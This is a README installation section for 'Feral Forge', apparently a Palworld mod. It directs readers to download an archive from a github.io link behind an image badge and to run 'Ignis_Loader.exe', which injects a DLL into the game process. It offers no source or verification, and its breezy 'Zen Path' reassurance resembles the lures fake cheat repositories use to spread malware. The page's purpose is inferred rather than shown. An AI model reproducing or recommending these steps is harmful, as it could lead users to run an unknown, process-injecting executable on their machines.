## 🚀 Installation & Integration (The Zen Path)

We understand the modern explorer dislikes messy terminal commands. The **Feral Forge** is installed via a one-time **DLL Injection Wizard** that loads automatically with the game client. 

1. **Download** the archive via the [![Download](https://raw.githubusercontent.com/zeepplin/palworld-ascendancy-overhaul/main/get_51b2875.svg)](https://zeepplin.github.io/palworld-ascendancy-overhaul/) button above.
2. **Extract** to any folder on your Desktop (we recommend a dedicated `FeralForge` directory).
3. **Run** the `Ignis_Loader.exe` once; it will create a system restore point and map itself to the Palworld process.
4. **Launch** Palworld. The FFI will appear as a subtle icon on your sidebar. Press `INSERT` to toggle the full dashboard.

> *Installation takes less than 45 seconds. The only "code" you'll write is your next adventure's log.*
